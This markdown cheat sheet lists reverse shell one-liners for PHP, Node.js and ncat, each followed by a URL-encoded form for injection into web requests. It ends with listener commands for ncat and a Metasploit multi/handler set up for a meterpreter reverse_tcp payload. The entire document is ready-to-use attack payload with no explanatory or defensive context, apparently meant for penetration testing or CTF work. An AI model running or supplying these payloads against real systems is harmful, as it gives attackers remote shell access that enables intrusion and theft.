# REVERSE
> PHP <br>
php -r '$sock=fsockopen("127.0.0.1",1337);exec("sh <&3 >&3 2>&3");'<br>
encoded uri : php%20-r%20'$sock=fsockopen(%22127.0.0.1%22,1024);exec(%22sh%20%3C&3%20%3E&3%202%3E&3%22);'

> NODE JS<br>
require('child_process').exec('nc -e sh 127.0.0.1 1337')<br>
encoded uri : require('child_process').exec('nc%20-e%20sh%20127.0.0.1%201024');

> NETCAT <br>
ncat 127.0.0.1 1024 -e sh<br>
encoded uri : ncat%20127.0.0.1%201024%20-e%20sh


# LISTENER
> NETCAT<br>
$ ncat -lvnp 1024<br>

> MSFCONSOLE<br>
$ msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 127.0.0.1; set lport 1024; exploit"
